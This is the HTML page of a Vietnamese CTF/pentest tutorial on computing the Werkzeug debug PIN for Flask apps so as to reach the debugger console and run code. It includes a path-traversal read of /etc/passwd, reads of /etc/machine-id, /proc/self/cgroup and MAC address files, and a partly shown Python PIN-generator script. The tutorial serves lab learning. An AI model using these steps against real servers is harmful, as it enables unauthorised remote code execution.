@@ -1,0 +1,341 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Research: Bypass Werkzeug Debug PIN | H00d1eBl4ck</title><meta name="author" content="H00d1eBl4ck"><meta name="copyright" content="H00d1eBl4ck"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Flask &#x2F; Werkzeug Debug PIN – Full Theory &amp; Exploitation Guide1. Tổng quan bài toánDạng bài này xuất hiện rất thường xuyên trong CTF Web &#x2F; Pentest lab khi:  Server chạy Flask ở chế độ deb">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Research: Bypass Werkzeug Debug PIN">
+<meta property="og:url" content="https://elliotbigfan.github.io/2026/01/18/Research/web/flask-bin/index.html">
+<meta property="og:site_name" content="H00d1eBl4ck">
+<meta property="og:description" content="Flask &#x2F; Werkzeug Debug PIN – Full Theory &amp; Exploitation Guide1. Tổng quan bài toánDạng bài này xuất hiện rất thường xuyên trong CTF Web &#x2F; Pentest lab khi:  Server chạy Flask ở chế độ deb">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://elliotbigfan.github.io/img/research/web/poster.png">
+<meta property="article:published_time" content="2026-01-18T13:31:56.000Z">
+<meta property="article:modified_time" content="2026-01-18T13:37:53.037Z">
+<meta property="article:author" content="H00d1eBl4ck">
+<meta property="article:tag" content="Research">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://elliotbigfan.github.io/img/research/web/poster.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Research: Bypass Werkzeug Debug PIN",
+  "url": "https://elliotbigfan.github.io/2026/01/18/Research/web/flask-bin/",
+  "image": "https://elliotbigfan.github.io/img/research/web/poster.png",
+  "datePublished": "2026-01-18T13:31:56.000Z",
+  "dateModified": "2026-01-18T13:37:53.037Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "H00d1eBl4ck",
+      "url": "https://elliotbigfan.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon_io/favicon.ico"><link rel="canonical" href="https://elliotbigfan.github.io/2026/01/18/Research/web/flask-bin/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Research: Bypass Werkzeug Debug PIN',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/research/web/poster.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/favicon_io/favicon.ico" alt="Logo"><span class="site-name">H00d1eBl4ck</span></a><a class="nav-page-title" href="/"><span class="site-name">Research: Bypass Werkzeug Debug PIN</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Research: Bypass Werkzeug Debug PIN</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-18T13:31:56.000Z" title="Created 2026-01-18 20:31:56">2026-01-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-18T13:37:53.037Z" title="Updated 2026-01-18 20:37:53">2026-01-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Research/">Research</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Research/Flask/">Flask</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>8mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Flask-Werkzeug-Debug-PIN-–-Full-Theory-Exploitation-Guide"><a href="#Flask-Werkzeug-Debug-PIN-–-Full-Theory-Exploitation-Guide" class="headerlink" title="Flask &#x2F; Werkzeug Debug PIN – Full Theory &amp; Exploitation Guide"></a>Flask &#x2F; Werkzeug Debug PIN – Full Theory &amp; Exploitation Guide</h1><h2 id="1-Tong-quan-bai-toan"><a href="#1-Tong-quan-bai-toan" class="headerlink" title="1. Tổng quan bài toán"></a>1. Tổng quan bài toán</h2><p>Dạng bài này xuất hiện rất thường xuyên trong CTF Web &#x2F; Pentest lab khi:</p>
+<ul>
+<li>Server chạy <strong>Flask ở chế độ debug</strong></li>
+<li>Debugger của <strong>Werkzeug</strong> được bật</li>
+<li>Truy cập debugger yêu cầu <strong>PIN</strong></li>
+<li>Ứng dụng tồn tại <strong>primitive đọc file tùy ý</strong> (LFI, path traversal, SSRF → file)</li>
+</ul>
+<p>Mục tiêu cuối cùng:</p>
+<blockquote>
+<p><strong>Tính toán chính xác Werkzeug Debug PIN để truy cập interactive console → RCE</strong></p>
+</blockquote>
+<hr>
+<h2 id="2-Dieu-kien-tien-quyet-Prerequisites"><a href="#2-Dieu-kien-tien-quyet-Prerequisites" class="headerlink" title="2. Điều kiện tiên quyết (Prerequisites)"></a>2. Điều kiện tiên quyết (Prerequisites)</h2><p>Bài <strong>bắt buộc</strong> phải có ít nhất một trong các primitive sau:</p>
+<ul>
+<li>LFI: <code>../../../../etc/passwd</code></li>
+<li>Read arbitrary file</li>
+<li>SSRF đọc được <code>file://</code></li>
+<li>Debug endpoint leak source code</li>
+</ul>
+<p>Nếu <strong>không đọc được file hệ thống</strong>, bài này <strong>không giải được</strong>.</p>
+<hr>
+<h2 id="3-Workflow-tong-quat"><a href="#3-Workflow-tong-quat" class="headerlink" title="3. Workflow tổng quát"></a>3. Workflow tổng quát</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[ Read file primitive ]</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">[ Xác định Werkzeug version ]</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">[ Xác định hash algorithm (MD5 / SHA1) ]</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">[ Thu thập public bits ]</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">[ Thu thập private bits ]</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">[ Generate PIN offline ]</span><br><span class="line">        |</span><br><span class="line">        v</span><br><span class="line">[ Truy cập /console hoặc debugger ]</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="4-Buoc-1-–-Xac-dinh-Werkzeug-dung-MD5-hay-SHA1"><a href="#4-Buoc-1-–-Xac-dinh-Werkzeug-dung-MD5-hay-SHA1" class="headerlink" title="4. Bước 1 – Xác định Werkzeug dùng MD5 hay SHA1"></a>4. Bước 1 – Xác định Werkzeug dùng MD5 hay SHA1</h2><h3 id="4-1-File-can-doc"><a href="#4-1-File-can-doc" class="headerlink" title="4.1 File cần đọc"></a>4.1 File cần đọc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&lt;python-site-packages&gt;/werkzeug/__init__.py</span><br></pre></td></tr></table></figure>
+
+<p>Hoặc:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/pythonX.Y/site-packages/werkzeug/debug/__init__.py</span><br><span class="line">/home/&lt;username&gt;/.local/lib/pythonX.Y/site-packages/werkzeug/debug/__init__.py</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-Cach-nhan-biet"><a href="#4-2-Cach-nhan-biet" class="headerlink" title="4.2 Cách nhận biết"></a>4.2 Cách nhận biết</h3><table>
+<thead>
+<tr>
+<th>Dấu hiệu</th>
+<th>Kết luận</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>hashlib.md5()</code></td>
+<td>Werkzeug cũ → <strong>MD5</strong></td>
+</tr>
+<tr>
+<td><code>hashlib.sha1()</code></td>
+<td>Werkzeug ≥ 2.x → <strong>SHA1</strong></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>Flask cũ &#x2F; CTF cổ điển thường dùng <strong>MD5</strong></p>
+</blockquote>
+<hr>
+<h2 id="5-Buoc-2-–-Ly-thuyet-Werkzeug-Debug-PIN"><a href="#5-Buoc-2-–-Ly-thuyet-Werkzeug-Debug-PIN" class="headerlink" title="5. Bước 2 – Lý thuyết Werkzeug Debug PIN"></a>5. Bước 2 – Lý thuyết Werkzeug Debug PIN</h2><h3 id="5-1-Cong-thuc-tong-quat"><a href="#5-1-Cong-thuc-tong-quat" class="headerlink" title="5.1 Công thức tổng quát"></a>5.1 Công thức tổng quát</h3><p>Werkzeug sinh PIN từ 2 nhóm dữ liệu:</p>
+<h4 id="Public-bits-co-the-doan-doc-duoc"><a href="#Public-bits-co-the-doan-doc-duoc" class="headerlink" title="Public bits (có thể đoán &#x2F; đọc được)"></a>Public bits (có thể đoán &#x2F; đọc được)</h4><ul>
+<li><code>username</code></li>
+<li><code>modname</code></li>
+<li><code>appname</code></li>
+<li><code>path</code> tới file Flask</li>
+</ul>
+<h4 id="Private-bits-bat-buoc-phai-leak"><a href="#Private-bits-bat-buoc-phai-leak" class="headerlink" title="Private bits (bắt buộc phải leak)"></a>Private bits (bắt buộc phải leak)</h4><ul>
+<li>MAC address (<code>uuid.getnode()</code>)</li>
+<li>Machine ID (<code>/etc/machine-id</code>)</li>
+<li>Cgroup suffix (<code>/proc/self/cgroup</code>)</li>
+</ul>
+<hr>
+<h2 id="6-Buoc-3-–-Thu-thap-du-lieu-can-thiet"><a href="#6-Buoc-3-–-Thu-thap-du-lieu-can-thiet" class="headerlink" title="6. Bước 3 – Thu thập dữ liệu cần thiết"></a>6. Bước 3 – Thu thập dữ liệu cần thiết</h2><h3 id="6-1-Public-bits"><a href="#6-1-Public-bits" class="headerlink" title="6.1 Public bits"></a>6.1 Public bits</h3><table>
+<thead>
+<tr>
+<th>Giá trị</th>
+<th>Cách lấy</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>username</td>
+<td><code>/etc/passwd</code>, user chạy web (www-data, flask, root)</td>
+</tr>
+<tr>
+<td>modname</td>
+<td>thường là <code>flask.app</code></td>
+</tr>
+<tr>
+<td>appname</td>
+<td><code>Flask</code>, <code>wsgi_app</code>, <code>DebuggedApplication</code></td>
+</tr>
+<tr>
+<td>flask path</td>
+<td>stacktrace (làm chương trình bị exception) hoặc đoán (thường nằm ở <code>/home/&lt;username&gt;/.local/lib/pythonX.Y/site-packages/flask/app.py</code>)</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="6-2-Private-bits-quan-trong"><a href="#6-2-Private-bits-quan-trong" class="headerlink" title="6.2 Private bits (quan trọng)"></a>6.2 Private bits (quan trọng)</h3><h4 id="MAC-address"><a href="#MAC-address" class="headerlink" title="MAC address"></a>MAC address</h4><p>Đọc từ:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sys/class/net/eth0/address (thông thường là cái này)</span><br></pre></td></tr></table></figure>
+
+<p>Có thể brute các interface phổ biến:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eth0, ens33, docker0, lo</span><br></pre></td></tr></table></figure>
+<p>Hoặc đọc file <code>/proc/net/arp</code> để xác định <strong>device</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IP address       HW type     Flags       HW address            Mask     Device</span><br><span class="line">172.17.0.1       0x1         0x2         02:42:a0:22:d7:29     *        eth0</span><br></pre></td></tr></table></figure>
+
+<p>Werkzeug dùng:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uuid.getnode() → integer</span><br></pre></td></tr></table></figure>
+
+<h4 id="Machine-ID"><a href="#Machine-ID" class="headerlink" title="Machine ID"></a>Machine ID</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/machine-id</span><br></pre></td></tr></table></figure>
+
+<p>Fallback:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/sys/kernel/random/boot_id</span><br></pre></td></tr></table></figure>
+
+<h4 id="Cgroup"><a href="#Cgroup" class="headerlink" title="Cgroup"></a>Cgroup</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/cgroup</span><br></pre></td></tr></table></figure>
+
+<p>Ví dụ:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0::/init.scope</span><br></pre></td></tr></table></figure>
+
+<p>Werkzeug <strong>chỉ lấy phần sau dấu &#x2F;</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init.scope</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="7-Cach-Werkzeug-xu-ly-machine-id-cgroup"><a href="#7-Cach-Werkzeug-xu-ly-machine-id-cgroup" class="headerlink" title="7. Cách Werkzeug xử lý machine-id + cgroup"></a>7. Cách Werkzeug xử lý machine-id + cgroup</h2><p>Pseudo-code:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux = machine_id</span><br><span class="line">linux += cgroup.rpartition(<span class="string">&quot;/&quot;</span>)[<span class="number">2</span>]</span><br></pre></td></tr></table></figure>
+
+<p>Ví dụ:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">machine-id = abc123</span><br><span class="line">cgroup     = 0::/init.scope</span><br><span class="line"></span><br><span class="line">=&gt; real_machine_id = abc123init.scope</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="8-Tool-sinh-PIN-–-MD5-version"><a href="#8-Tool-sinh-PIN-–-MD5-version" class="headerlink" title="8. Tool sinh PIN – MD5 version"></a>8. Tool sinh PIN – MD5 version</h2><p>File: <strong>gen-md5-pin.py</strong></p>
+<p>👉 Dùng khi Werkzeug sử dụng <code>hashlib.md5</code></p>
+<ul>
+<li>Chuẩn hóa MAC (string → integer)</li>
+<li>Ghép machine-id + cgroup</li>
+<li>Hash theo đúng thứ tự Werkzeug</li>
+<li>Format PIN giống hệt thật</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">normalize_mac</span>(<span class="params">mac: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Werkzeug uses uuid.getnode() which returns an integer.</span></span><br><span class="line"><span class="string">    Accept:</span></span><br><span class="line"><span class="string">      - integer (uuid.getnode output)</span></span><br><span class="line"><span class="string">      - aa:bb:cc:dd:ee:ff</span></span><br><span class="line"><span class="string">      - aa-bb-cc-dd-ee-ff</span></span><br><span class="line"><span class="string">    Return:</span></span><br><span class="line"><span class="string">      - stringified integer (Werkzeug-compatible)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mac = mac.strip().lower()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># already integer</span></span><br><span class="line">    <span class="keyword">if</span> mac.isdigit():</span><br><span class="line">        <span class="keyword">return</span> mac</span><br><span class="line"></span><br><span class="line">    <span class="comment"># MAC address</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> mac <span class="keyword">or</span> <span class="string">&quot;-&quot;</span> <span class="keyword">in</span> mac:</span><br><span class="line">        <span class="keyword">for</span> sep <span class="keyword">in</span> (<span class="string">&quot;:&quot;</span>, <span class="string">&quot;-&quot;</span>):</span><br><span class="line">            mac = mac.replace(sep, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(mac) != <span class="number">12</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid MAC address format&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">int</span>(mac, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid MAC format&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_machine_id</span>(<span class="params">machine_id: <span class="built_in">str</span>, cgroup: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Mimic Werkzeug get_machine_id():</span></span><br><span class="line"><span class="string">      linux = machine-id or boot-id + last part of cgroup</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mid = machine_id.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cgroup:</span><br><span class="line">        <span class="comment"># Werkzeug: linux += f.readline().strip().rpartition(b&quot;/&quot;)[2]</span></span><br><span class="line">        cg = cgroup.strip().encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        cg = cg.rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        mid += cg</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_pin</span>(<span class="params"></span></span><br><span class="line"><span class="params">    username: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    modname: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    appname: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    flask_path: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    mac: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    machine_id: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    cgroup: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        appname,</span><br><span class="line">        flask_path,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    mac = normalize_mac(mac)</span><br><span class="line">    real_machine_id = build_machine_id(machine_id, cgroup)</span><br><span class="line"></span><br><span class="line">    private_bits = [</span><br><span class="line">        mac,</span><br><span class="line">        real_machine_id,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    h = hashlib.md5()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line"></span><br><span 